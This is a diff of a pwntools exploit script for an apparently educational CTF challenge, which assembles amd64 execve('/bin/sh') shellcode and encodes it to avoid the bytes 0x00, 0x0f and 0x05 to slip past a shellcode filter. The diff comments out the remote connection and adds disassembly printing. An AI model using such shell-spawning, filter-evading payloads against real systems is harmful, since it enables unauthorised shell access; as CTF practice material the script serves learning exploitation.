@@ -5,9 +5,9 @@ from pwn import *
 
 context.arch = 'amd64'
 
-r = remote('edu-ctf.csie.org', 10150)
+# r = remote('edu-ctf.csie.org', 10150)
 # r = remote('127.0.0.1', 7126)
-r.recvuntil('shellcode >')
+# r.recvuntil('shellcode >')
 a = asm("""
         push 0x68
         mov rax, 0x732f2f2f6e69622f 
@@ -19,11 +19,15 @@ a = asm("""
         syscall
                 """)
 aa = ['0x00', '0x0f', '0x05']
+print(disasm(a))
 a = pwnlib.encoders.encoder.encode(a, avoid=aa, force=1)
+print("-------------")
+print(disasm(a))
+
 # print(a)
 # pause()
 # a = pwnlib.encoders.encoder.encode(a, avoid='0x0f', force=1)
 # a = pwnlib.encoders.encoder.encode(a, avoid='0x05', force=1)
 # embed()
-r.send(a)
-r.interactive()
+# r.send(a)
+# r.interactive()
